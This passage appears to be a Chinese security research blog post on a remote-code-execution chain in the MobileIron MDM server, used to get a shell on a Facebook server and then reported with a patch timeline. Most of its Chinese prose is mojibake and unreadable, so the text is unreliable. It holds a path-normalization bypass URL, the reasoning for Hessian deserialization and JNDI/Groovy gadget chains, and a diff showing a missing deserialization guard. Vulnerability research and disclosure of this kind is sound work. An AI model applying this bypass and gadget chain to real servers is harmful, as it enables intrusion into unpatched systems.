&lt;p&gt;æ²’éŒ¯! å°±æ˜¯æˆ‘å€‘åœ¨ &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;2015 å¹´&lt;/a&gt;ç™¼ç¾ï¼Œä¸¦ä¸”åœ¨ &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt; ä¸Šæ‰€ç™¼è¡¨çš„é‡å° Reverse Proxy æ¶æ§‹çš„æ–°æ”»æ“Šé¢ &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! é€™å€‹å„ªç§€çš„æŠ€å·§æœ€è¿‘ä¹Ÿè¢«å¾ˆå¥½çš„åˆ©ç”¨åœ¨ &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;CVE-2020-5902&lt;/a&gt;ï¼ŒF5 BIG-IP TMUI çš„é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œä¸Š!&lt;/p&gt;

&lt;p&gt;é€é Apache èˆ‡ Tomcat å°è·¯å¾‘ç†è§£çš„ä¸ä¸€è‡´ï¼Œæˆ‘å€‘å¯ä»¥é€éä»¥ä¸‹æ–¹å¼ç¹é Rewrite Rule å†ä¸€æ¬¡æ”»æ“Š Web Service!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç¢°! å› æ­¤ç¾åœ¨ä¸ç®¡æ˜¯ 8443 çš„ç®¡ç†ä»‹é¢é‚„æ˜¯ 443 çš„ä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢ï¼Œæˆ‘å€‘éƒ½å¯ä»¥ç¢°åˆ°æœ‰ Hessian ååºåˆ—åŒ–å­˜åœ¨çš„ Web Service äº†!&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åˆ©ç”¨æ¼æ´&quot;&gt;å¦‚ä½•åˆ©ç”¨æ¼æ´&lt;/h2&gt;

&lt;p&gt;ç¾åœ¨è®“æˆ‘å€‘å›åˆ° Hessian ååºåˆ—åŒ–çš„åˆ©ç”¨ä¸Š! é‡å° Hessian ååºåˆ—åŒ–ï¼Œ&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; å·²ç¶“åœ¨ä»–çš„ &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; ä¸­åšäº†ä¸€å€‹å¾ˆè©³ç´°çš„ç ”ç©¶å ±å‘Š! å¾ä»–æ‰€é–‹æºçš„ &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; åŸå§‹ç¢¼ä¸­ï¼Œæˆ‘å€‘ä¹Ÿå­¸ç¿’åˆ° Hessian åœ¨ååºåˆ—åŒ–éç¨‹ä¸­é™¤äº†é€é HashMap è§¸ç™¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;equals()&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; ç­‰è§¸ç™¼é»å¤–ï¼Œä¹Ÿå¯é€é &lt;code class=&quot;highlighter-rouge&quot;&gt;XString&lt;/code&gt; ä¸²å‡º &lt;code class=&quot;highlighter-rouge&quot;&gt;toString()&lt;/code&gt;ï¼Œè€Œç›®å‰é—œæ–¼ Hessian ååºåˆ—åŒ–å·²å­˜åœ¨çš„åˆ©ç”¨éˆæœ‰å››æ¢:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œæ ¹æ“šæˆ‘å€‘çš„ç›®æ¨™ç’°å¢ƒï¼Œå¯ä»¥è§¸ç™¼çš„åªæœ‰ Spring AOP é€™æ¢åˆ©ç”¨éˆ!&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Â &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI æ³¨å…¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI æ³¨å…¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;âˆš&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI æ³¨å…¥&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ç„¡è«–å¦‚ä½•ï¼Œæˆ‘å€‘ç¾åœ¨æœ‰äº† JNDI æ³¨å…¥å¾Œï¼Œæ¥ä¸‹ä¾†åªè¦é€é &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; åœ¨ Black Hat USA 2016 ä¸Šæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt; å°±å¯ä»¥å–å¾—é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œäº†â€¦ ç”˜å®‰å…§?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è‡ªå¾ &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; åœ¨ Black Hat ç™¼è¡¨äº†é€™å€‹æ–°çš„æ”»æ“Šå‘é‡å¾Œï¼Œä¸çŸ¥é“å¹«åŠ©äº†å¤šå°‘å¤§å¤§å°å°çš„é§­å®¢ï¼Œç”šè‡³æœƒæœ‰äººèªç‚ºã€Œé‡åˆ°ååºåˆ—åŒ–å°±ç”¨ JNDI é€å°±å°äº†!ã€ï¼Œä½†è‡ªå¾ 2018 å¹´åæœˆï¼ŒJava çµ‚æ–¼æŠŠé—œæ–¼ JNDI æ³¨å…¥çš„æœ€å¾Œä¸€å¡Šæ‹¼åœ–çµ¦ä¿®å¾©ï¼Œé€™å€‹ä¿®å¾©è¢«è¨˜è¼‰åœ¨ &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3149&quot;&gt;CVE-2018-3149&lt;/a&gt; ä¸­ï¼Œè‡ªæ­¤ä¹‹å¾Œï¼Œæ‰€æœ‰ Java é«˜æ–¼ 8u181, 7u191, 6u201 çš„ç‰ˆæœ¬çš†ç„¡æ³•é€é JNDI/LDAP çš„æ–¹å¼åŸ·è¡Œç¨‹å¼ç¢¼ï¼Œå› æ­¤è‹¥è¦åœ¨æœ€æ–°ç‰ˆæœ¬çš„ MobileIron ä¸Šå¯¦ç¾æ”»æ“Šï¼Œæˆ‘å€‘å‹¢å¿…å¾—é¢å°é€™å€‹å•é¡Œ!&lt;/p&gt;

&lt;p&gt;é—œæ–¼ CVE-2018-3149ï¼Œæ˜¯é€éå°‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; çš„é è¨­å€¼æ”¹ç‚º &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; çš„æ–¹å¼ä»¥é”åˆ°ç¦æ­¢æ”»æ“Šè€…ä¸‹è¼‰é ç«¯ Bytecode å–å¾—åŸ·è¡Œç¨‹å¼ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;ä½†å¹¸é‹çš„æ˜¯ï¼Œæˆ‘å€‘ä¾ç„¶å¯ä»¥é€é JNDI çš„ Naming Reference åˆ°æœ¬æ©Ÿæ—¢æœ‰çš„ Class Factory ä¸Š! é€éé¡ä¼¼ &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt; çš„æ¦‚å¿µï¼Œå°‹æ‰¾æœ¬æ©Ÿ ClassPath ä¸­å¯åˆ©ç”¨çš„é¡åˆ¥å»åšæ›´é€²ä¸€æ­¥çš„åˆ©ç”¨ï¼Œè©³ç´°çš„æ‰‹æ³•å¯åƒè€ƒç”± &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; åœ¨ 2019 å¹´å¹´åˆæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt;ï¼Œè£¡é¢è©³ç´°æ•˜è¿°äº†å¦‚ä½•é€é Tomcat çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; å»è¼‰å…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; é”æˆä»»æ„ç¨‹å¼ç¢¼åŸ·è¡Œ!&lt;/p&gt;

&lt;p&gt;é€™æ¢è·¯çœ‹ä¼¼é€šæš¢ï¼Œä½†å¯¦éš›ä¸Šå»å·®é‚£éº¼ä¸€é»ï¼Œç”±æ–¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; åœ¨ Tomcat 8 å¾Œæ‰è¢«å¼•å…¥ï¼Œå› æ­¤ä¸Šé¢çš„ç¹éæ–¹å¼åªèƒ½åœ¨ Tomcat ç‰ˆæœ¬å¤§æ–¼ 8 å¾Œçš„æŸå€‹ç‰ˆæœ¬æ‰èƒ½æˆåŠŸï¼Œè€Œæˆ‘å€‘çš„ç›®æ¨™å‰‡æ˜¯ Tomcat 7.xï¼Œå› æ­¤å¾—ç‚º &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; å°‹æ‰¾ä¸€å€‹æ–°çš„åˆ©ç”¨éˆ! è€Œç¶“éæœå°‹ï¼Œç™¼ç¾åœ¨ &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; çš„&lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;æ–‡ç« &lt;/a&gt;ä¸­æ‰€æåˆ°:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;é™¤äº† javax.el.ELProcessorï¼Œå½“ç„¶ä¹Ÿè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„ç±»ç¬¦åˆæ¡ä»¶å¯ä»¥ä½œä¸º beanClass æ³¨å…¥åˆ° BeanFactory ä¸­å®ç°åˆ©ç”¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœç›®æ ‡æœºå™¨ classpath ä¸­æœ‰ groovy çš„åº“ï¼Œåˆ™å¯ä»¥ç»“åˆä¹‹å‰ Orange å¸ˆå‚…å‘è¿‡çš„ &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins çš„æ¼æ´å®ç°åˆ©ç”¨&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç›®æ¨™çš„ ClassPath ä¸Šå‰›å¥½æœ‰ Groovy å­˜åœ¨! æ–¼æ˜¯æˆ‘å€‘åˆè®“ Meta Programming å‰å¤§äº†ä¸€æ¬¡ :D&lt;/p&gt;

&lt;p&gt;ç„¶è€Œäº‹å¯¦ä¸Šï¼Œç›®æ¨™ä¼ºæœå™¨ä¸Š Groovy ç‰ˆæœ¬ç‚º 1.5.6ï¼Œæ˜¯ä¸€å€‹è·ä»Šåå¹´å‰è€èˆŠåˆ°ä¸æ”¯æ´ Meta Programming çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥æˆ‘å€‘æœ€å¾Œé‚„æ˜¯åŸºæ–¼ Groovy çš„ç¨‹å¼ç¢¼ï¼Œé‡æ–°å°‹æ‰¾äº†ä¸€å€‹åœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; ä¸Šçš„åˆ©ç”¨éˆ! è©³ç´°çš„åˆ©ç”¨éˆå¯åƒè€ƒæˆ‘é€çµ¦ &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; çš„é€™å€‹ &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt;!&lt;/p&gt;

&lt;h2 id=&quot;æ”»æ“Š-facebook&quot;&gt;æ”»æ“Š Facebook&lt;/h2&gt;

&lt;p&gt;ç¾åœ¨æˆ‘å€‘å·²ç¶“æœ‰äº†ä¸€å€‹åŸºæ–¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;JNDI&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; çš„å®Œç¾é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œæ¼æ´ï¼Œæ¥ä¸‹ä¾†å°±é–‹å§‹æ”»æ“Š Facebook å§! å¾å‰æ–‡æåˆ°ï¼Œæˆ‘å€‘åœ¨ 2016 å¹´æ™‚å°±å·²çŸ¥ Facebook ä½¿ç”¨ MobileIron ç•¶ä½œä»–å€‘çš„ MDM è§£æ±ºæ–¹æ¡ˆï¼Œé›–ç„¶ç¾åœ¨å†æª¢æŸ¥ä¸€æ¬¡ç™¼ç¾é¦–é ç›´æ¥è®Šæˆ 403 Forbidden äº†ï¼Œä¸éå¹¸é‹çš„æ˜¯ Web Service å±¤ä¸¦ç„¡é˜»æ“‹!&lt;br /&gt;
s&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¬äº‹ä¿±å‚™ï¼Œåªæ¬ æ±é¢¨! æ­£ç•¶è¦æ”»æ“Š Facebook çš„å‰å¹¾å¤©ï¼Œæˆ‘å€‘çªç„¶æƒ³åˆ°ï¼Œå¾ä¸Šæ¬¡&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;é€²å…¥ Facebook ä¼ºæœå™¨&lt;/a&gt;çš„ç¶“é©—ï¼Œç”±æ–¼å®‰å…¨ä¸Šçš„è€ƒé‡ï¼ŒFacebook ä¼¼ä¹æœƒç¦æ­¢æ‰€æœ‰å°å¤–éƒ¨éæ³•çš„é€£ç·šï¼Œé€™é»å°æˆ‘å€‘ JNDI æ³¨å…¥æ”»æ“Šæœ‰è‘—è‡³é—œé‡è¦çš„å½±éŸ¿! é¦–å…ˆï¼ŒJNDI æ³¨å…¥çš„æ ¸å¿ƒå°±æ˜¯é€éå—å®³è€…é€£ç·šè‡³æ”»æ“Šè€…æ§åˆ¶çš„æƒ¡æ„ä¼ºæœå™¨ï¼Œä¸¦æ¥æ”¶å›å‚³çš„æƒ¡æ„ Naming Reference å¾Œæ‰€å°è‡´çš„ä¸€ç³»åˆ—åˆ©ç”¨ï¼Œä½†ç¾åœ¨é€£æœ€é–‹å§‹çš„é€£ç·šåˆ°æ”»æ“Šè€…çš„æƒ¡æ„ä¼ºæœå™¨éƒ½ç„¡æ³•ï¼Œæ›´åˆ¥è«‡å¾ŒçºŒçš„åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è‡ªæ­¤ï¼Œæˆ‘å€‘é—œæ–¼ JNDI æ³¨å…¥çš„è·¯å·²å…¨è¢«å°æ®ºï¼Œåªèƒ½å›åˆ° Hessian ååºåˆ—åŒ–é‡æ–°æ€è€ƒ! è€Œç¾æœ‰çš„åˆ©ç”¨éˆçš†ç„¡æ³•é”åˆ°é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œï¼Œæ‰€ä»¥æˆ‘å€‘å‹¢å¿…å¾—æ‹‹æ£„ JNDI æ³¨å…¥ï¼Œå°‹æ‰¾ä¸€å€‹æ–°çš„åˆ©ç”¨éˆ!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç‚ºäº†å°‹æ‰¾æ–°çš„åˆ©ç”¨éˆï¼Œå¿…é ˆå…ˆæ·±å…¥ç†è§£å·²å­˜åœ¨åˆ©ç”¨éˆçš„åŸç†åŠæˆå› ï¼Œåœ¨é‡è®€ &lt;a href=&quot;https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; çš„è«–æ–‡å¾Œï¼Œæˆ‘å°å…¶ä¸­ä¸€å¥è©±æ„Ÿåˆ°äº†å¥½å¥‡:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovyâ€™s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å“¦ï¼Œç‚ºä»€éº¼ä½œè€…è¦ç‰¹åœ°è£œä¸Šé€™å¥è©±å‘¢? æˆ‘é–‹å§‹æœ‰å€‹çŒœæƒ³:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ä½œè€…è©•ä¼°éæŠŠ Groovy ç•¶æˆåˆ©ç”¨éˆçš„å¯è¡Œæ€§ï¼Œé›–ç„¶è¢«é™åˆ¶ä½äº†ï¼Œä½†ä¸€å®šè¦ºå¾—æœ‰æ©Ÿæœƒæ‰æœƒå¯«é€²è«–æ–‡ä¸­!&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾é€™å€‹çŒœæƒ³å‡ºç™¼ï¼Œé›–ç„¶ Groovy çš„åˆ©ç”¨éˆè¢« &lt;code class=&quot;highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; é™åˆ¶ä½äº†ï¼Œä½†å‰›å¥½æˆ‘å€‘ç›®æ¨™ç‰ˆæœ¬çš„ Groovy å¾ˆèˆŠï¼Œèªªä¸å®šå°šæœªæŠŠé€™å€‹é™åˆ¶åŠ å…¥ç¨‹å¼åº«!&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘æ¯”è¼ƒäº†ä¸€ä¸‹ Groovy-1.5.6 èˆ‡æœ€æ–°ç‰ˆæœ¬ä½æ–¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; ä¸­çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;readSolve()&lt;/code&gt; å¯¦ç¾:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°çš„ç¢ºåœ¨èˆŠç‰ˆæ˜¯æ²’æœ‰ &lt;code class=&quot;highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; é™åˆ¶çš„ï¼Œè€Œå¾Œä¾†ç¶“éè€ƒå¤å¾Œä¹Ÿç™¼ç¾ï¼Œé€™å€‹é™åˆ¶å…¶å¯¦ Groovy è‡ªå·±ç‚ºäº†å› æ‡‰ 2015 å¹´æ‰€å‡ºç¾ Java ååºåˆ—åŒ–æ¼æ´çš„æ¸›ç·©æªæ–½ï¼Œå› æ­¤ä¹Ÿè¢«åˆ†é…äº† &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; é€™å€‹æ¼æ´ç·¨è™Ÿ! ç”±æ–¼ Groovy åªæ˜¯ä¸€å€‹åªåœ¨å…§éƒ¨ä½¿ç”¨ã€ä¸æœƒå°å¤–çš„å°é…è§’ï¼Œå› æ­¤åœ¨æ²’æœ‰ç‰¹åˆ¥éœ€æ±‚ä¸‹é–‹ç™¼è€…ä¹Ÿä¸æœƒç‰¹åœ°å»æ›´æ–°å®ƒï¼Œå› æ­¤æˆç‚ºäº†æˆ‘å€‘æ”»æ“Šéˆçš„ä¸€ç’°! é€™ä¹Ÿå†ä¸€æ¬¡é©—è­‰äº†ã€Œä»»ä½•çœ‹ä¼¼èˆ‰ç„¡è¼•é‡çš„å°å…ƒä»¶ï¼Œéƒ½æœ‰å¯èƒ½æˆç‚ºä½ è¢«æ”»æ“Šçš„ä¸»å› ã€!&lt;/p&gt;

&lt;p&gt;æœ€å¾Œï¼Œç•¶ç„¶! æˆ‘å€‘æˆåŠŸçš„å–å¾—åœ¨ Facebook ä¼ºæœå™¨ä¸Šçš„ Shellï¼Œä»¥ä¸‹æ˜¯å½±ç‰‡:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;æ¼æ´é€šå ±èˆ‡ä¿®å¾©&quot;&gt;æ¼æ´é€šå ±èˆ‡ä¿®å¾©&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘ç´„åœ¨ä¸‰æœˆæ™‚å®Œæˆæ•´å€‹æ¼æ´ç ”ç©¶ï¼Œä¸¦åœ¨ 4/3 æ—¥å°‡ç ”ç©¶æˆæœå¯«æˆå ±å‘Šï¼Œé€é &lt;code class=&quot;highlighter-rouge&quot;&gt;security@mobileiron.com&lt;/code&gt; å›å ±çµ¦ MobileIron! å®˜æ–¹æ”¶åˆ°å¾Œè‘—æ‰‹é–‹å§‹ä¿®å¾©ï¼Œåœ¨ 6/15 é‡‹å‡ºä¿®è£œç¨‹å¼ä¸¦è¨˜éŒ„äº†ä¸‰å€‹ CVE ç·¨è™Ÿï¼Œè©³ç´°çš„ä¿®å¾©æ–¹å¼è«‹åƒé–± &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;MobileIron å®˜æ–¹ç¶²ç«™&lt;/a&gt;!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç•¶å®˜æ–¹é‡‹å‡ºä¿®è£œç¨‹å¼å¾Œï¼Œæˆ‘å€‘ä¹Ÿé–‹å§‹ç›£æ§ä¸–ç•Œä¸Šæ‰€æœ‰æœ‰ä½¿ç”¨ MobileIron ä¼æ¥­çš„ä¿®å¾©ç‹€æ³ï¼Œé€™è£¡åªå–®ç´”æª¢æŸ¥éœæ…‹æª”æ¡ˆçš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; Headerï¼Œçµæœåƒ…ä¾›åƒè€ƒä¸å®Œå…¨ä»£è¡¨å¯¦éš›æƒ…æ³(Unknown ä»£è¡¨æœªé–‹ 443/8443 ç„¡æ³•åˆ©ç”¨):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;èˆ‡æ­¤åŒæ™‚ï¼Œæˆ‘å€‘ä¹ŸæŒçºŒç›£æ§è‘— Facebookï¼Œä¸¦åœ¨ 15 å¤©ç¢ºèªéƒ½æœªä¿®è£œå¾Œæ–¼ 7/2 æ—¥æˆåŠŸé€²å…¥ Facebook ä¼ºæœå™¨å¾Œå›å ± Facebook Bug Bounty Program!&lt;/p&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;åˆ°æ­¤ï¼Œæˆ‘å€‘å·²ç¶“æˆåŠŸç¤ºç¯„äº†å¦‚ä½•å°‹æ‰¾ä¸€å€‹ MDM ä¼ºæœå™¨çš„æ¼æ´! å¾ç¹é Java èªè¨€å±¤ç´šçš„ä¿è­·ã€ç¶²è·¯é™åˆ¶ï¼Œåˆ°å¯«å‡ºæ”»æ“Šç¨‹å¼ä¸¦æˆåŠŸçš„åˆ©ç”¨åœ¨ Bug Bounty Program ä¸Š! å› ç‚ºæ–‡é•·ï¼Œé‚„æœ‰è¨±å¤šä¾†ä¸åŠåˆ†äº«çš„æ•…äº‹ï¼Œé€™è£¡åƒ…æ¢åˆ—ä¸€ä¸‹ä¾›æœ‰èˆˆè¶£ç¹¼çºŒç ”ç©¶çš„äººåƒè€ƒ!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ä½•å¾ MDM ä¼ºæœå™¨ï¼Œæ§åˆ¶å›å“¡å·¥çš„æ‰‹æ©Ÿè£ç½®&lt;/li&gt;
  &lt;li&gt;å¦‚ä½•åˆ†æ MobileIron çš„ç§æœ‰ MI Protocol&lt;/li&gt;
